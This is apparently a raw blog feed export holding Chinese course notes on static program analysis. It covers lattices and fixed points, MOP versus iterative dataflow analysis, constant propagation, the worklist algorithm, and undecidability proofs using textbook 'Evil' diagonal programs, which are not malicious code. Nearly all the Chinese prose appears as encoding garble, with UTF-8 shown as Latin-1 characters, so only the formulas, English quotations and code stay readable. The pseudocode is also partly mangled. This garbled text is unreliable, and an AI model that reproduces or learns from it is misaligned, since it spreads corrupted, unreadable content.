$x=f(x)$</p><p>ç”±$\perp$çš„å®šä¹‰ï¼Œæˆ‘ä»¬æœ‰$\perp \sqsubseteq x$;</p><p>ä¸‹é¢ç”¨æ•°å½’æ³•è¯æ˜ï¼š</p><p>ç”±äº $f$ æ˜¯å•è°ƒçš„ï¼Œå› æ­¤</p><script type="math/tex; mode=display">f(\perp) \sqsubseteq f(x)</script><p>å¯¹äº$f^i(\perp)\sqsubseteq f^i(x)$ï¼Œç”±äº $f$ æ˜¯å•è°ƒçš„ï¼Œå› æ­¤æœ‰</p><script type="math/tex; mode=display">f^{i+1}(\perp)\sqsubseteq f^{i+1}(x)</script><p>å› æ­¤å¯¹äºä»»æ„iï¼Œæœ‰</p><script type="math/tex; mode=display">f^i(\perp)\sqsubseteq f^i(x)</script><p>åˆå› ä¸º$x=f(x)$ï¼Œæ‰€ä»¥å­˜åœ¨ä¸€ä¸ªiï¼Œæœ‰$f^i(\perp)\sqsubseteq f^i(x)=x$ï¼Œå› æ­¤æœ‰</p><script type="math/tex; mode=display">f^{Fix} = f^k(\perp) \sqsubseteq x</script><p>å› æ­¤$f^i(\perp)$ æ˜¯æœ€å°ä¸åŠ¨ç‚¹ã€‚</p><h1 id="Relate-lterative-Algorithm-to-Fixed-Point-Theorem"><a href="#Relate-lterative-Algorithm-to-Fixed-Point-Theorem" class="headerlink" title="Relate lterative Algorithm to Fixed Point Theorem"></a>Relate lterative Algorithm to Fixed Point Theorem</h1><p>å¦‚ä½•å°†è¿­ä»£ç®—æ³•å’Œä¸åŠ¨ç‚¹å®šç†è”ç³»èµ·æ¥ï¼Ÿ</p><ol><li>ç¨‹åºä¸­æ¯ä¸€ä¸ªçŠ¶æ€ä¸ºä¸€ä¸ªproduct lattice</li><li>Transfer functionå’Œjoin/meet fucntionå¯ä»¥è§†ä¸ºF</li></ol><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200812205336289.png" alt="image-20200812205336289"></p><p>ä¸‹é¢åªéœ€è¦è¯æ˜Transfer functionå’Œ join/meet functionå‡ä¸ºå•è°ƒçš„å³å¯</p><ol><li><p>Transfer functionæ˜¯å•è°ƒçš„ï¼Œå› ä¸ºé€šè¿‡ä¹‹å‰åˆ†æï¼Œæ‰€æœ‰Gen/Killçš„å‡½æ•°éƒ½æ˜¯å•è°ƒçš„ï¼›</p></li><li><p>Join/meet functionæ˜¯å•è°ƒçš„ï¼Œè¯æ˜å¦‚ä¸‹</p><p>è¦è¯Join/meet functionï¼Œå°±æ˜¯è¦è¯$\forall x, y, z \in L, x \sqsubseteq y \Rightarrow x\sqcup z \sqsubseteq y \sqcup z$</p><p>ç”± $\sqcup$ å®šä¹‰å¯å¾—ï¼Œ$y \sqsubseteq y \sqcup z$ï¼Œ</p><p>ç”±äº$\sqsubseteq$ä¼ é€’æ€§ï¼Œ$x \sqsubseteq y$ï¼Œå› æ­¤$x \sqsubseteq y \sqcup z$ï¼Œå› æ­¤ $y \sqcup z$ æ˜¯ $x$ çš„ä¸Šç•Œï¼Œ</p><p>æ³¨æ„åˆ° $y \sqcup z$ ä¹Ÿæ˜¯ $z$ çš„ä¸Šç•Œï¼Œè€Œ$x\sqcup z$ æ˜¯ $x$ å’Œ $z$ çš„æœ€å°ä¸Šç•Œï¼Œ</p><p>å› æ­¤ $ x \sqsubseteq y \Rightarrow x\sqcup z \sqsubseteq y \sqcup z$</p></li></ol><p><strong>è®¨è®ºç®—æ³•å¤æ‚åº¦</strong></p><p>å®šä¹‰æ ¼çš„é«˜åº¦å³ä»topè‡³bottomçš„æœ€é•¿è·¯å¾„é•¿ï¼Œ</p><blockquote><p>The height of a lattice $h$ is the length of the longest path from Top to Bottom in the lattice.</p></blockquote><p>æœ€åæƒ…å†µå³ä¸€æ¬¡è¿­ä»£ï¼Œåªå˜åŒ–ä¸€ä¸ªå•ä½é«˜åº¦ï¼Œå› æ­¤å¤æ‚åº¦ä¸º$O(h \times k)$.</p><h1 id="May-Must-Analysis-A-Lattice-View"><a href="#May-Must-Analysis-A-Lattice-View" class="headerlink" title="May/Must Analysis, A Lattice View*"></a>May/Must Analysis, A Lattice View*</h1><p>ä»»ä½•åˆ†æåˆå§‹çŠ¶æ€éƒ½ä»unsafeè‡³safeã€‚</p><p>ä¸ªäººå¯¹safeå’Œunsafeçš„ç†è§£ï¼šé’ˆå¯¹äºåˆ†æç»“æœè€Œè¨€ï¼Œå¤„ç†æ‰€æœ‰åˆ†æç»“æœåï¼Œç¨‹åºè¡Œä¸ºæ­£å¸¸ä¸ºsafeï¼Œåä¹‹ä¸ºunsafeï¼Œæç«¯çš„safeæ˜¯æ— ç”¨çš„ï¼ˆå¦‚å®‰å…¨æ‰«æä¸­çš„æ¨¡å¼åŒ¹é…ï¼‰<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200812214731510.png" alt="image-20200812214731510"></p><p>Mustå’ŒMayåˆ†æçš„ç¤ºæ„å›¾å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¯¹äºMuståˆ†æï¼Œæ¯ä¸ªä»£ç å—éƒ½æ˜¯ä» $\top$ å¼€å§‹çš„ï¼Œå› ä¸ºåœ¨ç¨‹åºä¸€å¼€å§‹ï¼Œç®—æ³•è®¤ä¸ºæ‰€æœ‰çš„å¾…åˆ†æå¯¹è±¡éƒ½æ˜¯â€œåˆæ ¼â€çš„ï¼ˆä¾‹å¦‚å­˜æ´»è¡¨è¾¾å¼åˆ†æä¸­ï¼Œç®—æ³•è®¤ä¸ºæ¯ä¸ªè¡¨è¾¾å¼éƒ½æ˜¯æˆæ´»çš„ï¼‰â€”â€”è¿™æ˜¯ä¸€ä¸ªä¸å®‰å…¨çš„çŠ¶æ€ï¼Œç»è¿‡ä¸æ–­è¿­ä»£ï¼Œç®—æ³•é€æ¸ä¸‹é™åˆ°æœ€å¤§ä¸åŠ¨ç‚¹ï¼Œè™½ç„¶å·²ç»è¿‡äº†truthç‚¹ï¼ˆæ¼æŠ¥ï¼‰ï¼Œä½†æ˜¯è¿™å·²ç»æ˜¯æœ€å¥½æƒ…å†µäº†ï¼ˆè¶Šå¾€ä¸‹èµ°è¶Šsafeä½†æ˜¯ç»“æœä¹Ÿæ²¡æ„ä¹‰äº†ï¼‰ï¼Œå¯¹è¿™äº›ç»“æœåšä¼˜åŒ–èƒ½ç¡®ä¿ç¨‹åºä¸å‡ºé”™ï¼ˆsafeï¼‰ã€‚</p><p>å¯¹äºMayåˆ†æï¼Œæ¯ä¸ªä»£ç å—ä» $\perp$ å¼€å§‹ï¼Œå³åœ¨ä¸€å¼€å§‹ï¼Œç®—æ³•è®¤ä¸ºæ‰€æœ‰åˆ†æå¯¹è±¡éƒ½æ˜¯ä¸åˆæ ¼çš„ï¼ˆä¾‹å¦‚å®šä¹‰å¯è¾¾æ€§åˆ†æä¸­ï¼Œç®—æ³•è®¤ä¸ºæ¯ä¸€æ¡å®šä¹‰éƒ½æ²¡æœ‰æ–°çš„å®šä¹‰ï¼‰â€”â€”è¿™æ˜¯Mayç±»å‹çš„ä¸å®‰å…¨çŠ¶æ€ï¼Œç»è¿‡ä¸æ–­è¿­ä»£ï¼Œç®—æ³•é€æ¸ä¸Šå‡åˆ°æœ€å°ä¸åŠ¨ç‚¹ï¼ŒåŒæ ·ä¹Ÿè¿‡äº†truthï¼ˆè¯¯æŠ¥ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯åˆ†æçš„æœ€å¥½æƒ…å†µï¼Œç®—æ³•ä¾æ—§åœç•™åœ¨safeåŒºåŸŸã€‚</p><h1 id="Distributivityï¼ˆåˆ†é…æ€§ï¼‰-and-MOP"><a href="#Distributivityï¼ˆåˆ†é…æ€§ï¼‰-and-MOP" class="headerlink" title="Distributivityï¼ˆåˆ†é…æ€§ï¼‰ and MOP"></a>Distributivityï¼ˆåˆ†é…æ€§ï¼‰ and MOP</h1><h2 id="MOPï¼ˆMeet-Over-All-Paths-Solutionï¼‰"><a href="#MOPï¼ˆMeet-Over-All-Paths-Solutionï¼‰" class="headerlink" title="MOPï¼ˆMeet-Over-All-Paths Solutionï¼‰"></a>MOPï¼ˆMeet-Over-All-Paths Solutionï¼‰</h2><p>è®¾ $s_x$ ä¸ºæ¯ä¸€ä¸ªstatmentsï¼Œè®¾ $F_p$ æ˜¯ä¸€ä¸ªè·¯å¾„ $P$ ä¸Šçš„ transfer functionï¼Œé‚£ä¹ˆ$MOP[S_i]=\sqcup/\sqcap_{\text{A path }P\text{ from Entry to }S_{i}} F_p(OUT[Entry])$.</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200814215920162.png" alt="image-20200814215920162"></p><p>å°±æ˜¯è¯´ï¼Œä¹‹å‰æ•°æ®æµåˆ†æçš„ç»“æœæ˜¯<strong>æµæ•æ„Ÿ</strong>çš„ï¼Œè€Œ MOP çš„ç»“æœæ˜¯è·¯å¾„æ•æ„Ÿçš„ï¼Œ</p><p>ä¾‹å¦‚ä¸‹å›¾æ‰€ç¤ºçš„æ•°æ®æµï¼Œæ•°æ®æµåˆ†æçš„ç»“æœæ˜¯ $\mathrm{IN}\left[\mathrm{s}_{4}\right]=f_{s_{3}}\left(f_{s_{1}}(\mathrm{OUT}[ entry ]) \sqcup f_{S_{2}}( OUT [ Entry ])\right)$ï¼Œè€ŒMOPæ˜¯ $ \mathrm{MOP}\left[\mathrm{s}_{4}\right]=f_{S_{3}}\left(f_{s_{1}}(\mathrm{OUT}[ entry ])\right) \sqcup f_{S_{3}}\left(f_{S_{2}}(\mathrm{OUT}[ Entry ])\right)$ï¼ˆæ³¨æ„$f_{s_3}$çš„ä½ç½®ï¼‰</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200814220329588.png" alt="image-20200814220329588" style="zoom:50%;"></p><h2 id="Iterative-Algorithm-v-s-MOP"><a href="#Iterative-Algorithm-v-s-MOP" class="headerlink" title="Iterative Algorithm v.s. MOP"></a>Iterative Algorithm v.s. MOP</h2><p>MOPæ¯”Iterativeåˆ†ææ›´ç²¾ç¡®ï¼Œä¹Ÿå°±æ˜¯è¯´è·¯å¾„æ•æ„Ÿæ¯”æ•æ„Ÿæ›´ç²¾ç¡®ï¼Œä¸‹é¢ä¸ºè¯æ˜ï¼ˆè¿™é‡Œåªéœ€è¯æ˜ä¸¤æ¡è·¯å¾„çš„æƒ…å†µï¼Œå…¶å®ƒæ•°å½’å³å¯ï¼‰ï¼š</p><p>ç”± $\sqcup$ çš„å®šä¹‰å¾— $\mathrm{x} \sqsubseteq \mathrm{x} \sqcup \mathrm{y}$ ä¸” $\mathrm{y} \sqsubseteq \mathrm{x} \sqcup \mathrm{y}$ï¼›</p><p>å› ä¸º $F$ æ˜¯å•è°ƒçš„ï¼Œå› æ­¤æœ‰ $F(x) \sqsubseteq F(x \sqcup y)$ ä¸” $F(y) \sqsubseteq F(x \sqcup y)$ï¼›</p><p>å› æ­¤$F(x\sqcup y)$ æ˜¯ $F(x)$ å’Œ $F(y)$ çš„ä¸Šç•Œï¼›</p><p>åˆå› ä¸º$F(x)\sqcup F(y)$æ˜¯ $F(x)$ å’Œ $F(y)$ çš„æœ€å°ä¸Šç•Œï¼›</p><p>å› æ­¤ $ F(x) \sqcup F(y) \sqsubseteq F(x\sqcup y)$ï¼Œå³$MOP \sqsubseteq Ours$ã€‚</p><p>ç„¶è€Œï¼Œå½“Fæ˜¯distributiveï¼ˆFæ»¡è¶³åˆ†é…ç‡ï¼‰æ—¶ï¼ŒInterativeå’ŒMOPä¸€æ ·å‡†ç¡®ã€‚</p><p>BitVectoræˆ–æ˜¯Gen/Killé—®é¢˜ï¼ˆset union/intersection for join/meetï¼‰éƒ½æ˜¯æ»¡è¶³åˆ†é…ç‡çš„</p><h1 id="Constant-Propagation"><a href="#Constant-Propagation" class="headerlink" title="Constant Propagation"></a>Constant Propagation</h1><blockquote><p>Given a variable $x$ at program point p, determine whether $x$ is guaranteed to hold a constant value at $p$</p></blockquote><p>å¯¹äºåœ¨ç¨‹åºç‚¹ $p$ çš„ä¸€ä¸ªå˜é‡ $x$ï¼Œåˆ¤æ–­ $x$ æ˜¯å¦ä¸ºåœ¨ $p$ ç‚¹ä¸ºä¸€ä¸ªå¸¸é‡</p><p>åˆ†æç»“æœï¼šå¯¹äºæ¯ä¸€ä¸ªCFGèŠ‚ç‚¹ï¼Œå¯¹åº”ä¸€ä¸ª $(x,v)$ é›†åˆï¼Œ$x$ æ˜¯å˜é‡ï¼Œ$v$ æ˜¯ $x$ çš„å€¼</p><h2 id="Lattice"><a href="#Lattice" class="headerlink" title="Lattice"></a>Lattice</h2><p>Domainï¼š UNDEF â†’ {â€¦, -2, -1, 0, 1, 2, â€¦} â†’ NAC ï¼Œâ†’ è¡¨ç¤º $\sqsubseteq$ å…³ç³»</p><p>Meet Operator $\sqcap$ï¼š</p><ul><li>$\mathrm{NAC} \sqcap v= \mathrm{NAC}$</li><li>$\mathrm{UNDEF} \sqcap v= v$</li><li>$c \sqcap v= \mathrm{NAC}$ ï¼ˆc ä¸ºä¸€å¸¸é‡ï¼‰</li><li>$c \sqcap c= c$</li><li>$c_1 \sqcap c_2 = \mathrm{NAC}$</li></ul><h2 id="Transfer-Function"><a href="#Transfer-Function" class="headerlink" title="Transfer Function"></a>Transfer Function</h2><p>è®¨è®ºtransfer functionï¼Œå¯¹äºä¸€ä¸ªèµ‹å€¼è¯­å¥ <code>s: x= ...</code> æ¥è¯´ï¼Œå®šä¹‰å…¶ F ä¸º</p><script type="math/tex; mode=display">F: \mathrm{OUT}[s]=gen \cup(\mathrm{IN}[s]-\{(x, \_)\})</script><ul><li><code>s: x=c;</code>  $gen=\{(x,c)\}$</li><li><code>s: x=y;</code> $gen=\{(x, val(y))\}$</li><li><code>s: x=y op z;</code> $gen=\{(x, f(x,z))\}$ </li></ul><p>è€Œ $f(x,z)$ æœ‰ä¸‰ç§æƒ…å†µï¼š</p><script type="math/tex; mode=display">f(y,z)=\left\{\begin{array}{ll} val(y) \text { op } val(z) & \text {// if val(y) and val(z) are constants } \\ \text { NAC } & \text {//if val(y) or val(z) is NAC } \\\text { UNDEF } & \text {// otherwise } \\\end{array}\right.</script><h2 id="functionä¸æ»¡è¶³åˆ†é…æ€§"><a href="#functionä¸æ»¡è¶³åˆ†é…æ€§" class="headerlink" title="functionä¸æ»¡è¶³åˆ†é…æ€§"></a>functionä¸æ»¡è¶³åˆ†é…æ€§</h2><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œ$F(X\sqcap Y)$ ä¸­Cçš„å€¼ä¸º<strong>NAC</strong>ï¼Œè€Œ$F(X) \sqcap F(Y)$ä¸­ C çš„å€¼ä¸º<strong>10</strong>ï¼Œå› æ­¤Fä¸æ»¡è¶³åˆ†é…æ€§ã€‚</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200815173321586.png" alt="image-20200815173321586"></p><h1 id="Worklist-Algorithm"><a href="#Worklist-Algorithm" class="headerlink" title="Worklist Algorithm"></a>Worklist Algorithm</h1><p>Iterative Algorithmçš„ä¼˜åŒ–ï¼ŒIterative å­˜åœ¨å†—ä½™çš„è®¡ç®—ï¼Œè€ŒWorkliståªè®¡ç®—æœ‰å˜åŒ–çš„nodeï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">OUT[entry] =âˆ…;</span><br><span class="line"><span class="keyword">for</span>(each basic block B\entry) </span><br><span class="line">OUT[B] =âˆ…;</span><br><span class="line">    Worklistâ†all basic blocks</span><br><span class="line"><span class="keyword">while</span> (Worklist <span class="keyword">is</span> notempty) </span><br><span class="line">    Pick a basic block B <span class="keyword">from</span> Worklist</span><br><span class="line">old_OUT= OUT[B]</span><br><span class="line">        IN[B] =âŠ”OUT[P]; <span class="comment"># join/meet Pä¸ºBçš„å‰ç½®ä»£ç å—</span></span><br><span class="line">        OUT[B] = genB U (IN[B] - killB); <span class="comment"># transfer function </span></span><br><span class="line">        <span class="keyword">if</span>(old_OUTâ‰ OUT[B])</span><br><span class="line">        Add all successors of B to Worklis</span><br></pre></td></tr></table></figure><h1 id="åˆ†æç‰¹æ€§"><a href="#åˆ†æç‰¹æ€§" class="headerlink" title="åˆ†æç‰¹æ€§"></a>åˆ†æç‰¹æ€§</h1><ul><li>æµæ•æ„Ÿï¼šç¨‹åºè¯­å¥éšæ„è°ƒæ¢ä½ç½®ï¼Œåˆ†æç»“æœä¸å˜ä¸ºæµéæ•æ„Ÿï¼Œå¦åˆ™ä¸ºæµæ•æ„Ÿï¼›</li><li>è·¯å¾„æ•æ„Ÿï¼šè€ƒè™‘ç¨‹åºä¸­è·¯å¾„çš„å¯è¡Œæ€§ï¼›</li><li></li></ul><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬èŠ‚è¯¾ä¸»è¦ä»‹ç»æ ¼ï¼Œæ¥ç€ç”¨æ ¼æŠ½è±¡æè¿°æ•°æ®æµåˆ†æï¼Œè§£é‡Šä¸ºä»€ä¹ˆè¿­ä»£ç®—æ³•èƒ½å¤Ÿåˆ°è¾¾æœ€å¤§/æœ€å°ä¸åŠ¨ç‚¹ï¼Œæ¥ç€æ¯”è¾ƒäº†æµæ•æ„Ÿå’Œè·¯å¾„æ•æ„Ÿçš„å‡†ç¡®æ€§ï¼Œæœ€åä»‹ç»worklistç®—æ³•ï¼Œä»¥æå‡è¿­ä»£ç®—æ³•çš„æ•ˆç‡ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Program Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç™½ç›’æ‰«æ </tag>
            
            <tag> é™æ€ç¨‹åºåˆ†æ </tag>
            
            <tag> æ•°æ®æµåˆ†æ </tag>
            
            <tag> PL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰</title>
      <link href="/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E7%AE%80%E4%BB%8B%EF%BC%89/"/>
      <url>/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E7%AE%80%E4%BB%8B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>æ¯æ ¡è®¡ç®—æœºé™¢çš„ææ¨¾ã€è°­æ·»è€å¸ˆè®²çš„è¯¾ï¼Œå¬äº†ç¬¬ä¸€èŠ‚è¯¾å°±å“­äº†ï¼Œå†³å®šåšä¸€ä¸‹ç¬”è®°ï¼Œè¯¾ç¨‹ç½‘ç«™ <a href="https://pascal-group.bitbucket.io/teaching.htmlã€‚" target="_blank" rel="noopener">https://pascal-group.bitbucket.io/teaching.htmlã€‚</a></p><h1 id="PLçŸ¥è¯†ä½“ç³»"><a href="#PLçŸ¥è¯†ä½“ç³»" class="headerlink" title="PLçŸ¥è¯†ä½“ç³»"></a>PLçŸ¥è¯†ä½“ç³»</h1><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆç®€ä»‹ï¼‰/image-20200802113608162.png" alt="image-20200802113608162"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸»è¦åˆ†ä¸‰å¤§å—ï¼Œç†è®ºéƒ¨åˆ†åŒ…å«è¯­è¨€è®¾è®¡ã€ç±»å‹ç³»ç»Ÿã€è¯­ä¹‰å’Œé€»è¾‘æ£€æŸ¥ï¼›ç¯å¢ƒéƒ¨åˆ†åŒ…å«ç¼–è¯‘å™¨å’Œè¿è¡Œæ—¶è®¾è®¡ç­‰ï¼›åº”ç”¨éƒ¨åˆ†åŒ…å«ç¨‹åºåˆ†æã€ç¨‹åºéªŒè¯å’Œç¨‹åºç”Ÿæˆç­‰ï¼Œæœ¬è¯¾ç¨‹ä¸»è¦å…³æ³¨äºåº”ç”¨æ–¹é¢çš„ç¨‹åºåˆ†æã€‚</p><a id="more"></a><h1 id="Riceâ€™s-Theoremï¼ˆè±æ–¯å®šç†ï¼‰"><a href="#Riceâ€™s-Theoremï¼ˆè±æ–¯å®šç†ï¼‰" class="headerlink" title="Riceâ€™s Theoremï¼ˆè±æ–¯å®šç†ï¼‰"></a>Riceâ€™s Theoremï¼ˆè±æ–¯å®šç†ï¼‰</h1><h2 id="åœæœºé—®é¢˜"><a href="#åœæœºé—®é¢˜" class="headerlink" title="åœæœºé—®é¢˜"></a>åœæœºé—®é¢˜</h2><p>äº†è§£è±æ–¯å®šç†ï¼Œé¦–å…ˆè¯æ˜åœæœºé—®é¢˜æ˜¯ä¸å¯åˆ¤å®šçš„ï¼š</p><ul><li><p>å‡è®¾å­˜åœ¨åœæœºé—®é¢˜çš„åˆ¤å®šç®—æ³• <code>bool Halt(p)</code>ï¼›</p></li><li><p>å­˜åœ¨æ¶æ„ç¨‹åºï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Evil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Halt(Evil))</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>é‚£ä¹ˆ<code>Halt(Evil)</code>è¿”å›å­˜åœ¨çŸ›ç›¾ï¼š</p><ul><li>è‹¥è¿”å›çœŸï¼Œå³evilå¯åœæœºï¼Œé‚£ä¹ˆEvil()èµ°ifåˆ†æ”¯ï¼Œä½†è¯¥åˆ†æ”¯evilä¸å¯åœæœºï¼ŒçŸ›ç›¾ï¼›</li><li>è‹¥è¿”å›å‡ï¼Œå³evilä¸å¯åœæœºï¼Œé‚£ä¹ˆEvil()èµ°elseåˆ†æ”¯ï¼Œä½†è¿™æ ·evilå¯ä»¥åœæœºï¼ŒçŸ›ç›¾ã€‚</li></ul></li></ul><h2 id="å†…å­˜æ³„éœ²é—®é¢˜"><a href="#å†…å­˜æ³„éœ²é—®é¢˜" class="headerlink" title="å†…å­˜æ³„éœ²é—®é¢˜"></a>å†…å­˜æ³„éœ²é—®é¢˜</h2><p>å†…å­˜æ³„éœ²é—®é¢˜ä¸ä¹‹ç±»ä¼¼ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Evil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="built_in">malloc</span>();</span><br><span class="line">    <span class="keyword">if</span> (LeakFree(Evil))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Riceå®šç†"><a href="#Riceå®šç†" class="headerlink" title="Riceå®šç†"></a>Riceå®šç†</h2><p>ç»è¿‡ä¸Šé¢ä¸¤ä¸ªé—®é¢˜ï¼Œå¯ä»¥æ„Ÿè§‰åˆ°åªè¦æ˜¯ä¸€ä¸ªåˆ¤å®šé—®é¢˜ï¼Œå°±å¯ä»¥å¥—ç”¨ä¸Šé¢çš„evilæ¡†æ¶æ¥åè¯è¿™ä¸ªæ¡†æ¶æ˜¯ä¸å¯åˆ¤å®šçš„ï¼ŒRiceå®šç†å¯¹ä¸Šé¢æƒ…å†µä½œäº†æ€»ç»“ï¼š</p><blockquote><p>Any non-trivial property of the behavior of programs in a i.e. language is undecidable.</p></blockquote><p>å¯¹é€’å½’å¯æšä¸¾è¯­è¨€æ¥è¯´ï¼Œä¸å­˜åœ¨ä¸€ä¸ªå®Œç¾ï¼ˆSound&amp;Completeï¼‰çš„ï¼Œç”¨äºåˆ¤å®šç¨‹åºä¸­non-trivialçš„å±æ€§çš„æ–¹æ³•ã€‚</p><p>è¿™é‡Œâ€œnon-trivial propertyâ€å¯ä»¥ç†è§£ä¸ºç¨‹åºåˆ†æçš„ç§ç§ç›®çš„ï¼Œå¦‚å˜é‡æ˜¯å¦ç©ºæŒ‡é’ˆã€æ˜¯å¦å­˜åœ¨ä¿¡æ¯æ³„éœ²ç­‰ã€‚</p><ul><li>å¹³å‡¡ï¼ˆtrivialï¼‰å±æ€§ï¼šå¯¹å›¾çµæœºï¼ˆè¯­è¨€ï¼‰Pæ¥è¯´ï¼Œè¦ä¹ˆå¯¹å…¨ä½“ç¨‹åºéƒ½ä¸ºçœŸï¼Œè¦ä¹ˆå¯¹å…¨ä½“ç¨‹åºéƒ½ä¸ºå‡ï¼›</li><li>éå¹³å‡¡ï¼ˆnon-trivialï¼‰å±æ€§ï¼šä¸æ˜¯å¹³å‡¡çš„æ‰€æœ‰å±æ€§ï¼Œå¦‚åœæœºé—®é¢˜ã€ç©ºæŒ‡é’ˆã€ä¿¡æ¯æ³„éœ²ç­‰ã€‚</li></ul><p><strong>è¯æ˜ï¼š</strong></p><p>è®¾ç»™å®šå‡½æ•°ä¸Šæœ‰éå¹³å‡¡æ€§è´¨Pï¼Œå‡è®¾ç©ºé›†ï¼ˆå¯¹ä»»ä½•è¾“å…¥éƒ½ä¸è¾“å‡ºçš„ç¨‹åºï¼ŒåŒ…æ‹¬ä¸åœæœºç¨‹åºï¼‰ä¸æ»¡è¶³Pï¼Œå› ä¸ºPéå¹³å‡¡ï¼Œå› æ­¤ä¸€å®šæœ‰æ»¡è¶³Pçš„ç¨‹åºok_progï¼›</p><p>å‡è®¾æœ‰åˆ¤å®šæ€§è´¨Pçš„ç®—æ³• <code>P_holds()</code>ï¼Œç¼–å†™ä»¥ä¸‹ç¨‹åºåˆ¤æ–­ç¨‹åºqæ˜¯å¦åœæœºï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Bool <span class="title">halt</span><span class="params">(Program q, Input w)</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">evil</span><span class="params">(Input x)</span> </span>&#123;</span><br><span class="line">        q(w);<span class="comment">//å¦‚æœqä¸åœæœºï¼Œé‚£ä¹ˆevilä¸æ»¡è¶³P</span></span><br><span class="line">    ok_prog(x); <span class="comment">//å¦‚æœqåœæœºï¼Œé‚£ä¹ˆå¯åŠ¨ok_progï¼Œæ­¤æ—¶evilç¨‹åºç­‰åŒäºokprogç¨‹åº</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> P_holds(evil);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä¸Šé¢ç¨‹åºå€Ÿç”¨äº†P_holdsçš„èƒ½åŠ›æ¥åˆ¤æ–­åœæœºé—®é¢˜ï¼Œå…³é”®åœ¨äºevilï¼š</p><ul><li><p>å¦‚æœ<code>q(w)</code>ä¸åœæœºï¼Œé‚£ä¹ˆå› ä¸ºä¸åœæœºç¨‹åºä¸æ»¡è¶³Pï¼Œ<code>evil()</code>ä¸æ»¡è¶³Pï¼›</p></li><li><p>å¦‚æœ<code>q(w)</code>åœæœºï¼Œé‚£ä¹ˆ<code>evil(x)</code>ç­‰åŒäº<code>ok_prog(x)</code>å³<code>evil(x)</code>æ»¡è¶³P</p></li></ul><p>ç»¼ä¸Šï¼Œåªè¦åˆ¤å®š<code>evil(x)</code>æ˜¯å¦æ»¡è¶³Pï¼Œå°±å¯åˆ¤å®šåœæœºé—®é¢˜ï¼Œä½†æ˜¯ä¹‹å‰å·²ç»è¯æ˜è¿‡ï¼Œåœæœºé—®é¢˜æ˜¯ä¸å¯åˆ¤å®šé—®é¢˜ï¼Œå› æ­¤çŸ›ç›¾ã€‚</p><p>æ³¨æ„ï¼Œå°†ç©ºé›†æè¿°ä¸ºæ»¡è¶³Pï¼Œä¹Ÿå¯ä»¥ç”¨ç±»ä¼¼çš„æ–¹æ³•è¯æ˜ï¼ˆè®¾æœ‰ä¸æ»¡è¶³Pçš„ç¨‹åºno_progâ€¦ï¼‰</p><h1 id="å¯é 